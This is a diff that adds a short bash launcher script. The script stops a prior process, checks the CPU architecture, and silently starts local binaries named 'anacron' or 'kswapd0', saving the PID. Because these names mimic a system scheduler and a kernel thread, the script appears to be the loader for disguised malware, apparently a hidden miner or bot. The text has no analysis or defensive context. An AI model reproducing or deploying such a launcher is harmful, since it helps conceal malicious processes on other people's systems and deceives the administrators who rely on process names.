@@ -1,0 +1,15 @@
+#!/bin/bash
+./stop
+#./init0
+sleep 10
+pwd > dir.dir
+dir=$(cat dir.dir)
+ARCH=`uname -m`
+	if [ "$ARCH" == "i686" ]; then
+		nohup ./anacron >>/dev/null & 
+	elif [ "$ARCH" == "x86_64" ];   then
+		./kswapd0
+	fi
+echo $! > bash.pid
+ 
+
